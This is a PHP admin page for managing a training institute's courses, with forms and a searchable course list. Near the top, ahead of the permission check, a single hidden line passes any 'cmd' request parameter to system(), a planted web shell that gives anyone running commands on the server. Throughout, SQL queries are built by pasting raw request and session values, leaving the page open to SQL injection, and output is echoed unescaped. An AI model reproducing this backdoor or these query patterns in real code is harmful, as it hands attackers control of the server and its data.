<?php
	session_start();
	require_once "include/include.php";

    if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }

	if(!page_permission_ok(basename("admin-course.php"))){
		header("Location: index.php?action=logout");
	}

	$m_course_type="I";
	
	//prepare messages
	if ($_GET['msg']=="add")
		$MSG="Course information added.";
	if ($_GET['msg']=="modify")
		$MSG="Course information modified.";
	if ($_GET['msg']=="delete")
		$MSG="Course information deleted.";
	
	// Delete record
	if ($_GET['action']=="delete"){
		$childs=array();
		$childs[0]='mast_centre_course';
		$childs[1]='mast_fee_structure';
		$childs[2]='trans_batch';
		$childs[3]='trans_placement';
		$childs[4]='trans_student_course';
		if (child_exists($childs, "course_id", $_GET['id'])){
			$MSG="Child information exists for this course. It cannot be deleted.";
		}
		else{	
			$ssql="delete from mast_course where id=".$_GET['id'];
			$rs=mysqli_query($cn, $ssql);
			//update dml log
			write_dml_log("mast_course", $ssql);					
			echo "<script language='javascript'>window.location='admin-course.php?msg=delete';</script>";
		}
	}
	if ($_GET['action']=="activate"){
		$sql_activate="update mast_course set active='Y' where id=".$_GET['id'];
		$res_activate=mysqli_query($cn, $sql_activate);
	}
	if ($_GET['action']=="deactivate"){
		$sql_activate="update mast_course set active='N' where id=".$_GET['id'];
		$res_activate=mysqli_query($cn, $sql_activate);
	}
	// Modify record
	if ($_GET['action']=="modify"){
		$ssql="select * from mast_course where id=".$_GET['id'];
		$rs=mysqli_query($cn, $ssql);
		if ($rs){
			$rsitem=mysqli_fetch_object($rs);
			$m_course_name=$rsitem->course_name;
			$m_recognition_id=$rsitem->recognition_id;
			$m_course_type=$rsitem->it_nonit;
			if (is_null($rsitem->launch_date) || $rsitem->launch_date=="0000-00-00")
				$m_launch_date="";
			else
				$m_launch_date=$rsitem->launch_date;
			$m_no_of_semester=$rsitem->no_of_semester;
			$m_duration_week=$rsitem->duration_week;
			$m_duration_hours=$rsitem->duration_hours;
			$m_basic_course_fee_category1=$rsitem->basic_course_fee_category1;
			$m_basic_course_fee_category2=$rsitem->basic_course_fee_category2;
			$m_basic_course_fee_category3=$rsitem->basic_course_fee_category3;
			$m_basic_course_fee_category4=$rsitem->basic_course_fee_category4;
			$m_basic_course_fee_category5=$rsitem->basic_course_fee_category5;
			$m_basic_course_fee_category6=$rsitem->basic_course_fee_category6;
			$m_maximum_course_fee=$rsitem->maximum_course_fee;
			$m_active=$rsitem->active;
			$m_course_group_code=$rsitem->course_group_code;
			$m_course_group_code_dc=$rsitem->course_group_code_dc;			
		}
	}	

	//display searched courses only
	if(isset($_POST['display_course'])){
		if (strlen(trim($_POST['display_course_name']))>0){
			$_SESSION['disp_course_name']=$_POST['display_course_name'];
			$_SESSION['disp_active']=$_POST['active'];		
			$_SESSION['disp_sort']=$_POST['sort'];	
			sleep(3);	
			header("Location: admin-course.php");	
			exit();
		}
	}		
	
	// Save record
	if ($_POST['submit']=="Save"){
		//retain post variables
		$m_course_name=$_POST['course_name'];
		$m_recognition_id=$_POST['recognition_id'];
		$m_course_type=$_POST['course_type'];
		$m_launch_date=$_POST['launch_date'];
		$m_no_of_semester=$_POST['no_of_semester'];
		$m_duration_week=$_POST['duration_week'];
		$m_duration_hours=$_POST['duration_hours'];
		$m_basic_course_fee_category1=$_POST['basic_course_fee_category1'];
		$m_basic_course_fee_category2=$_POST['basic_course_fee_category2'];
		$m_basic_course_fee_category3=$_POST['basic_course_fee_category3'];
		$m_basic_course_fee_category4=$_POST['basic_course_fee_category4'];
		$m_basic_course_fee_category5=$_POST['basic_course_fee_category5'];
		$m_basic_course_fee_category6=$_POST['basic_course_fee_category6'];
		$m_maximum_course_fee=$_POST['maximum_course_fee'];
		$m_active=$_POST['active'];
		$m_course_group_code=$_POST['course_group_code'];
		$m_course_group_code_dc=$_POST['course_group_code_dc'];
		
		
		//validate
		$valid=1;
		
		if ($_POST['course_name']==""){
			$valid=0;
			$MSG .= "Please enter course name<br>";
		}
		if ($_POST['recognition_id']==""){
			$valid=0;
			$MSG .= "Please select recognition<br>";
		}
		if ($_POST['course_group_code']==0){
			$valid=0;
			$MSG .= "Please select course group<br>";
		}
		if ($_POST['duration_week']==""){
			$valid=0;
			$MSG .= "Please mention duration in weeks<br>";
		}
		/*if ($_POST['basic_course_fee_category1']=="" && $_POST['basic_course_fee_category2']=="" && $_POST['basic_course_fee_category3']=="" && $_POST['basic_course_fee_category4']=="" && $_POST['basic_course_fee_category5']=="" && $_POST['basic_course_fee_category6']==""){
			$valid=0;
			$MSG .= "Please mention at least one basic course fee<br>";
		}	*/	
		if ($_POST['active']==""){
			$valid=0;
			$MSG .= "Please mention whether active<br>";
		}
		$ssql="select group_name from mast_course_group_old where group_code in(select parent_group_code from mast_course_group_old where group_code=".$_POST['course_group_code'].")";
		
		$rs=mysqli_query( $cn, $ssql);
		$rsitem=mysqli_fetch_object($rs);
		if($rsitem->group_name!="DC" && $_POST['course_group_code_dc']>-1){
			$valid=0;
			$MSG .= "You cannot select the DC course group name in case of CC course";
		}
		//is duplicate
		if ($_GET['action']=="modify")
			$ssql="select * from mast_course where course_name='".$_POST['course_name']."' and id<>".$_GET['id'];
		else
			$ssql="select * from mast_course where course_name='".$_POST['course_name']."'";
		
		$rs=mysqli_query( $cn, $ssql);
		if (mysqli_num_rows($rs)>0){
			$valid=0;
			$MSG .= "Duplicate course name.";
		}			
		
	
		if ($valid==1){
			if ($_POST['no_of_semester']=="") $_POST['no_of_semester']=0;
			if ($_POST['duration_week']=="") $_POST['duration_week']=0;
			if ($_POST['duration_hours']=="") $_POST['duration_hours']=0;
			if ($_POST['basic_course_fee_category1']=="") $_POST['basic_course_fee_category1']=0;
			if ($_POST['basic_course_fee_category2']=="") $_POST['basic_course_fee_category2']=0;
			if ($_POST['basic_course_fee_category3']=="") $_POST['basic_course_fee_category3']=0;
			if ($_POST['basic_course_fee_category4']=="") $_POST['basic_course_fee_category4']=0;
			if ($_POST['basic_course_fee_category5']=="") $_POST['basic_course_fee_category5']=0;
			if ($_POST['basic_course_fee_category6']=="") $_POST['basic_course_fee_category6']=0;
			if ($_POST['maximum_course_fee']=="") $_POST['maximum_course_fee']=0;
			
			// if modify mode, update record
			if ($_GET['action']=="modify"){
				$ssql="update mast_course set course_name='".$_POST['course_name']."', course_group_code=".$_POST['course_group_code'].", course_group_code_dc=".$_POST['course_group_code_dc'].", recognition_id=".$_POST['recognition_id'].", launch_date='".$_POST['launch_date']."', no_of_semester=".$_POST['no_of_semester'].", duration_week=".$_POST['duration_week'].", duration_hours=".$_POST['duration_hours'].", basic_course_fee_category1=".$_POST['basic_course_fee_category1'].", basic_course_fee_category2=".$_POST['basic_course_fee_category2'].", basic_course_fee_category3=".$_POST['basic_course_fee_category3'].", basic_course_fee_category4=".$_POST['basic_course_fee_category4'].", basic_course_fee_category5=".$_POST['basic_course_fee_category5'].", basic_course_fee_category6=".$_POST['basic_course_fee_category6'].", maximum_course_fee=".$_POST['maximum_course_fee'].", active='".$_POST['active']."', it_nonit='".$_POST['course_type']."' where id=".$_GET['id'];
				$rs=mysqli_query($cn, $ssql);
				//echo $ssql; exit();
				//update dml log
				write_dml_log("mast_course", $ssql);									
				echo "<script language='javascript'>window.location='admin-course.php?msg=modify';</script>";
			}
			else { // else insert record
				$ssql="insert into mast_course (course_name, course_group_code, course_group_code_dc, recognition_id, launch_date, no_of_semester, duration_week, duration_hours, basic_course_fee_category1, basic_course_fee_category2, basic_course_fee_category3, basic_course_fee_category4, basic_course_fee_category5, basic_course_fee_category6, maximum_course_fee, active, it_nonit) values ('".$_POST['course_name']."',". $_POST['course_group_code'].",".$_POST['course_group_code_dc'].", ".$_POST['recognition_id'].", '".$_POST['launch_date']."', ".$_POST['no_of_semester'].", ".$_POST['duration_week'].", ".$_POST['duration_hours'].", ".$_POST['basic_course_fee_category1'].", ".$_POST['basic_course_fee_category2'].", ".$_POST['basic_course_fee_category3'].", ".$_POST['basic_course_fee_category4'].", ".$_POST['basic_course_fee_category5'].", ".$_POST['basic_course_fee_category6'].", ".$_POST['maximum_course_fee'].", '".$_POST['active']."', '".$_POST['course_type']."')";
				$rs=mysqli_query($cn, $ssql);
				//echo $ssql; exit();
				//update dml log
				write_dml_log("mast_course", $ssql);									
				echo "<script language='javascript'>window.location='admin-course.php?msg=add';</script>";
			}		
		}
	}
?>
<?php require "include/header.php"; ?>
<form name="f1" action="" method="post">
<table width="100%" border="0" align="center" cellpadding="5" cellspacing="0">
  
  
  <tr>
    <td align="left" valign="top">&nbsp;</td>
    <td align="left" valign="top" class="form_name">Course</td>
  </tr>
  <tr>
    <td align="left" valign="top">&nbsp;</td>
    <td align="left" valign="top" class="errmsg"><?php echo $MSG; ?></td>
  </tr>
  <tr>
    <td width="25%" align="left" valign="top">Course name * </td>
    <td width="75%" align="left" valign="top">
      <input name="course_name" type="text" id="course_name" value="<?php echo $m_course_name; ?>" size="70" maxlength="200">    </td>
  </tr>
  
  <tr>
    <td align="left" valign="top">Course group name * </td>
    <td align="left" valign="top"><select name="course_group_code" id="course_group_code">
	<option value="0">&nbsp;</option>
      <?php
			$ssql="select group_name ,group_code from mast_course_group_old where group_code not in (select parent_group_code from mast_course_group_old) order by group_name";
			$rs=mysqli_query( $cn, $ssql);
			while($rsitem=mysqli_fetch_object($rs)){
				if ($m_course_group_code==$rsitem->group_code)
					echo "<option value='".$rsitem->group_code."' selected='selected'>".$rsitem->group_name."</option>";
				else
					echo "<option value='".$rsitem->group_code."'>".$rsitem->group_name."</option>";
			}
		?>
    </select></td>
  </tr>
  <tr>
    <td align="left" valign="top">DC Course group name(for DC, only) </td>
    <td align="left" valign="top"><select name="course_group_code_dc" id="course_group_code_dc">
	<option value="-1">&nbsp;</option>
      <?php
			$ssql="select group_name ,group_code from mast_course_group_dc where group_code not in (select parent_group_code from mast_course_group_dc) order by group_name";
			$rs=mysqli_query( $cn, $ssql);
			while($rsitem=mysqli_fetch_object($rs)){
				if ($m_course_group_code_dc==$rsitem->group_code)
					echo "<option value='".$rsitem->group_code."' selected='selected'>".$rsitem->group_name."</option>";
				else
					echo "<option value='".$rsitem->group_code."'>".$rsitem->group_name."</option>";
			}
		?>
    </select></td>
  </tr>
  <tr>
    <td align="left" valign="top">Recognition * </td>
    <td align="left" valign="top">
	<select name="recognition_id" id="recognition_id">
        <?php
			$ssql="select * from mast_recognition order by recognition_code";
			$rs=mysqli_query( $cn, $ssql);
			while($rsitem=mysqli_fetch_object($rs)){
				if ($m_recognition_id==$rsitem->id)
					echo "<option value='".$rsitem->id."' selected='selected'>".$rsitem->recognition_name."</option>";
				else
					echo "<option value='".$rsitem->id."'>".$rsitem->recognition_name."</option>";
			}
		?>
      </select>	</td>
  </tr>
	<tr>
    <td align="left" valign="top">Course Type *</td>
    <td align="left" valign="top">
		<input name="course_type" type="radio" value="I" <?php if ($m_course_type=="I") echo "checked='checked'"; ?>>
		IT
		<input name="course_type" type="radio" value="N" <?php if ($m_course_type=="N") echo "checked='checked'"; ?>>
		Non IT	</td>
  </tr>
  <tr>
    <td align="left" valign="top">Launch date </td>
    <td align="left" valign="top">
	<input name="launch_date" type="text" id="launch_date" value="<?php echo $m_launch_date; ?>" size="20" maxlength="10" readonly="true"/>
    <IMG id="imgCalender" alt="a" src="images/calender.jpg" onclick="popUpCalendar(this, document.f1.launch_date, 'yyyy-mm-dd')" align="absMiddle" width="20" height="18">	</td>
  </tr>
  <tr>
    <td align="left" valign="top">Number of semesters/modules  </td>
    <td align="left" valign="top"><input name="no_of_semester" type="text" id="no_of_semester" value="<?php echo $m_no_of_semester; ?>" size="10" maxlength="2" onKeyPress="return goodint(event);" /> 
    (compulsory for semester-based courses) </td>
  </tr>
  <tr>
    <td align="left" valign="top">Duration in weeks * </td>
    <td align="left" valign="top"><input name="duration_week" type="text" id="duration_week" value="<?php echo $m_duration_week; ?>" size="10" maxlength="3" onkeypress="return goodint(event);" /></td>
  </tr>
  <tr>
    <td align="left" valign="top">Duration in hours </td>
    <td align="left" valign="top"><input name="duration_hours" type="text" id="duration_hours" value="<?php echo $m_duration_hours; ?>" size="10" maxlength="4" onkeypress="return goodint(event);" /></td>
  </tr>
  <!--<tr>
    <td align="left" valign="top">Basic course fee * </td>
    <td align="left" valign="top"><table width="100%" border="0" cellspacing="0" cellpadding="5">
      <tr>
        <td width="33%" align="left" valign="top">Bengal - Category A          </td>
        <td width="33%" align="left" valign="top">Bengal - Category B          </td>
        <td width="34%" align="left" valign="top">Outside Bengal - Category A          </td>
      </tr>
      <tr>
        <td align="left" valign="top"><input name="basic_course_fee_category1" type="text" id="basic_course_fee_category1" value="<?php echo $m_basic_course_fee_category1; ?>" size="20" maxlength="15" onkeypress="return goodfloat(event);" /></td>
        <td width="33%" align="left" valign="top"><input name="basic_course_fee_category2" type="text" id="basic_course_fee_category2" value="<?php echo $m_basic_course_fee_category2; ?>" size="20" maxlength="15" onkeypress="return goodfloat(event);" /></td>
        <td width="34%" align="left" valign="top"><input name="basic_course_fee_category3" type="text" id="basic_course_fee_category3" value="<?php echo $m_basic_course_fee_category3; ?>" size="20" maxlength="15" onkeypress="return goodfloat(event);" /></td>
      </tr>
      <tr>
        <td align="left" valign="top">Outside Bengal - Category B          </td>
        <td align="left" valign="top">Outside Bengal - Category C          </td>
        <td align="left" valign="top">Outside Bengal - Category D          </td>
      </tr>
      <tr>
        <td align="left" valign="top"><input name="basic_course_fee_category4" type="text" id="basic_course_fee_category4" value="<?php echo $m_basic_course_fee_category4; ?>" size="20" maxlength="15" onkeypress="return goodfloat(event);" /></td>
        <td align="left" valign="top"><input name="basic_course_fee_category5" type="text" id="basic_course_fee_category5" value="<?php echo $m_basic_course_fee_category5; ?>" size="20" maxlength="15" onkeypress="return goodfloat(event);" /></td>
        <td align="left" valign="top"><input name="basic_course_fee_category6" type="text" id="basic_course_fee_category6" value="<?php echo $m_basic_course_fee_category6; ?>" size="20" maxlength="15" onkeypress="return goodfloat(event);" /></td>
      </tr>
    </table></td>
  </tr>-->
  <tr>
    <td align="left" valign="top">Maximum course fee </td>
    <td align="left" valign="top"><input name="maximum_course_fee" type="text" id="maximum_course_fee" value="<?php echo $m_maximum_course_fee; ?>" size="20" maxlength="15" onkeypress="return goodfloat(event);" /></td>
  </tr>
  <tr>
    <td align="left" valign="top">Active * </td>
    <td align="left" valign="top">
		<input name="active" type="radio" value="Y" <?php if ($m_active=="Y") echo "checked='checked'"; ?>>
		Yes
		<input name="active" type="radio" value="N" <?php if ($m_active=="N") echo "checked='checked'"; ?>>
		No	</td>
  </tr>
  <tr>
    <td width="25%" align="left" valign="top">&nbsp;</td>
    <td width="75%" align="left" valign="top">
      <input name="submit" type="submit" id="submit" value="Save">    </td>
  </tr>
  <tr>
    <td colspan="2" align="left" valign="top"><hr /></td>
    </tr>
  <tr>
    <td align="left" valign="top">Search on course name (enter ALL to display all courses) </td>
    <td align="left" valign="top"><input name="display_course_name" type="text" id="display_course_name" value="<?php echo $_SESSION['disp_course_name']; ?>" size="70" maxlength="200" /></td>
  </tr>
  <tr>
    <td align="left" valign="top">Active</td>
    <td align="left" valign="top">
		<input name="active" type="radio" value="Y" <?php if ($_SESSION['disp_active']=="Y") echo "checked='checked'"; ?>>
		Yes
		<input name="active" type="radio" value="N" <?php if ($_SESSION['disp_active']=="N") echo "checked='checked'"; ?>>
		No</td>
  </tr>
  <tr>
    <td align="left" valign="top">Sort on </td>
    <td align="left" valign="top"><select name="sort" id="sort">
      <option value="name" <?php if ($_SESSION['disp_sort']=="name") echo "selected='selected'"; ?>>Course name</option>
      <option value="group" <?php if ($_SESSION['disp_sort']=="group") echo "selected='selected'"; ?>>Course group</option>
      <option value="recognition" <?php if ($_SESSION['disp_sort']=="recognition") echo "selected='selected'"; ?>>Recognition</option>
      <option value="type" <?php if ($_SESSION['disp_sort']=="type") echo "selected='selected'"; ?>>Course type</option>
      <option value="duration" <?php if ($_SESSION['disp_sort']=="duration") echo "selected='selected'"; ?>>Duration</option>
      <option value="basic_ba" <?php if ($_SESSION['disp_sort']=="basic_ba") echo "selected='selected'"; ?>>Basic fee (Beng A)</option>
      <option value="basic_bb" <?php if ($_SESSION['disp_sort']=="basic_bb") echo "selected='selected'"; ?>>Basic fee (Beng B)</option>
      <option value="basic_oa" <?php if ($_SESSION['disp_sort']=="basic_oa") echo "selected='selected'"; ?>>Basic fee (Out Beng A)</option>
      <option value="basic_ob" <?php if ($_SESSION['disp_sort']=="basic_ob") echo "selected='selected'"; ?>>Basic fee (Out Beng B)</option>
      <option value="basic_oc" <?php if ($_SESSION['disp_sort']=="basic_oc") echo "selected='selected'"; ?>>Basic fee (Out Beng C)</option>
      <option value="basic_od" <?php if ($_SESSION['disp_sort']=="basic_od") echo "selected='selected'"; ?>>Basic fee (Out Beng D)</option>
      <option value="active" <?php if ($_SESSION['disp_sort']=="active") echo "selected='selected'"; ?>>Active</option>
    </select>
    </td>
  </tr>
  <tr>
    <td align="left" valign="top">&nbsp;</td>
    <td align="left" valign="top"><input name="display_course" type="submit" id="display_course" value="Display" /></td>
  </tr>
  
  <tr>
    <td colspan="2" align="center" valign="top">
      <table width="100%" border="1" cellspacing="0" cellpadding="5">
        <tr>
          <td align="left" class="table-heading">Course Name </td>
         <td align="center" class="table-heading">Course group </td>
         <td align="center" class="table-heading">Course group DC</td>
          <td align="center" class="table-heading">Recognition </td>
          <td align="center" class="table-heading">Course type</td>		  
          <td align="center" class="table-heading">Duration in weeks </td>
<!--          <td align="center" class="table-heading">Basic fee (Beng A)</td>		  
          <td align="center" class="table-heading">Basic fee (Beng B)</td>		  
          <td align="center" class="table-heading">Basic fee (Out Beng A)</td>		  
          <td align="center" class="table-heading">Basic fee (Out Beng B)</td>		  
          <td align="center" class="table-heading">Basic fee (Out Beng C)</td>		  
          <td align="center" class="table-heading">Basic fee (Out Beng D)</td>		  
-->          <td align="left" class="table-heading">Active </td>
         <td align="center" class="table-heading">&nbsp;</td>
          <td align="center" class="table-heading">&nbsp;</td>
	<td align="center" class="table-heading">&nbsp;</td>
          <td align="center" class="table-heading">&nbsp;</td>
        </tr>
		<?php	
			if (strlen(trim($_SESSION['disp_course_name']))>0){
				if (strtoupper($_SESSION['disp_course_name'])=="ALL")
					$ssql="select mast_course.*, mast_recognition.recognition_code, mast_course_group_old.group_name, mast_course_group_dc.group_name 'dcg'
					from mast_course 
					left join mast_recognition on (mast_course.recognition_id=mast_recognition.id) 
					left join mast_course_group_old on (mast_course.course_group_code=mast_course_group_old.group_code) 
					left join mast_course_group_dc on (mast_course.course_group_code_dc=mast_course_group_dc.group_code) 
					where mast_course.course_name like '%' ";
				else				
					$ssql="select mast_course.*, mast_recognition.recognition_code, mast_course_group_old.group_name, mast_course_group_dc.group_name 'dcg'
					from mast_course 
					left join mast_recognition on (mast_course.recognition_id=mast_recognition.id) 
					left join mast_course_group_old on (mast_course.course_group_code=mast_course_group_old.group_code) 
					left join mast_course_group_dc on (mast_course.course_group_code_dc=mast_course_group_dc.group_code) 
					where mast_course.course_name like '%".$_SESSION['disp_course_name']."%' ";

				if ($_SESSION['disp_active']=="Y")
					$ssql .= " and mast_course.active='Y' ";
				if ($_SESSION['disp_active']=="N")
					$ssql .= " and mast_course.active='N' ";


				switch ($_SESSION['disp_sort']){
					case "name":
						$ssql .= " order by course_name";
						break;
					case "group":
						$ssql .= " order by group_name, course_name";
						break;
					case "recognition":
						$ssql .= " order by mast_recognition.recognition_code, group_name, course_name";
						break;
					case "type":
						$ssql .= " order by it_nonit, course_name";
						break;
					case "duration":
						$ssql .= " order by duration_week desc, course_name";
						break;
					case "basic_ba":
						$ssql .= " order by basic_course_fee_category1 desc, course_name";
						break;
					case "basic_bb":
						$ssql .= " order by basic_course_fee_category2 desc, course_name";
						break;
					case "basic_oa":
						$ssql .= " order by basic_course_fee_category3 desc, course_name";
						break;
					case "basic_ob":
						$ssql .= " order by basic_course_fee_category4 desc, course_name";
						break;
					case "basic_oc":
						$ssql .= " order by basic_course_fee_category5 desc, course_name";
						break;
					case "basic_od":
						$ssql .= " order by basic_course_fee_category6 desc, course_name";
						break;
					case "active":
						$ssql .= " order by active, mast_recognition.recognition_code, group_name, course_name";
						break;
					default:
						$ssql .= " order by mast_recognition.recognition_code, group_name, course_name";
						break;
				}
				
				$rs=mysqli_query( $cn, $ssql);
				$total_count=0;
				while ($rsitem=mysqli_fetch_object($rs)){
					echo "<tr>";
					echo "<td align='left'>".$rsitem->course_name."</td>";
					echo "<td align='center'>".(is_null($rsitem->group_name)? "&nbsp;": $rsitem->group_name)."</td>";
					echo "<td align='center'>".(is_null($rsitem->dcg)? "&nbsp;": $rsitem->dcg)."</td>";
					echo "<td align='center'>".(is_null($rsitem->recognition_code)? "&nbsp;": $rsitem->recognition_code)."</td>";
					echo "<td align='center'>".$rsitem->it_nonit."</td>";
					echo "<td align='center'>".($rsitem->duration_week==0? "&nbsp;": $rsitem->duration_week)."</td>";
					/*echo "<td align='right'>".number_format($rsitem->basic_course_fee_category1,0)."</td>";
					echo "<td align='right'>".number_format($rsitem->basic_course_fee_category2,0)."</td>";
					echo "<td align='right'>".number_format($rsitem->basic_course_fee_category3,0)."</td>";
					echo "<td align='right'>".number_format($rsitem->basic_course_fee_category4,0)."</td>";
					echo "<td align='right'>".number_format($rsitem->basic_course_fee_category5,0)."</td>";
					echo "<td align='right'>".number_format($rsitem->basic_course_fee_category6,0)."</td>";*/
					echo "<td align='center'>".(is_null($rsitem->active)? "&nbsp;": $rsitem->active)."</td>";
					/*//pick up no. of students in this course
					$ssql1="select count(id) as cnt from trans_student_course where course_id=".$rsitem->id;
					$rs1=mysql_query($ssql1, $cn);
					$rsitem1=mysql_fetch_object($rs1);
					echo "<td align='center'>".$rsitem1->cnt."</td>";
					echo "<td align='center'>&nbsp;</td>";*/
					echo "<td align='center'><a class='navmenu' href='admin-course.php?id=".$rsitem->id."&action=modify'>Modify</a></td>";
					echo "<td align='center'><a class='navmenu' href=javascript:delete_confirm('admin-course.php?id=".$rsitem->id."')>Delete</a></td>";
					echo "<td align='center'><a class='navmenu' href='admin-course.php?id=".$rsitem->id."&action=activate'>Activate</a></td>";
					echo "<td align='center'><a class='navmenu' href='admin-course.php?id=".$rsitem->id."&action=deactivate'>Deactivate</a></td>";
					echo "</tr>";
					$total_count++;
				}
				echo "<tr><td colspan='14' align='center'><strong>Total courses: ".$total_count."</strong></td></tr>";
			}
		?>		
      </table>    </td>
    </tr>
  <tr>
    <td align="center" valign="top">&nbsp;</td>
    <td align="left" valign="top">&nbsp;</td>
  </tr>
</table>
</form>
<?php	require "include/footer.php"; ?>
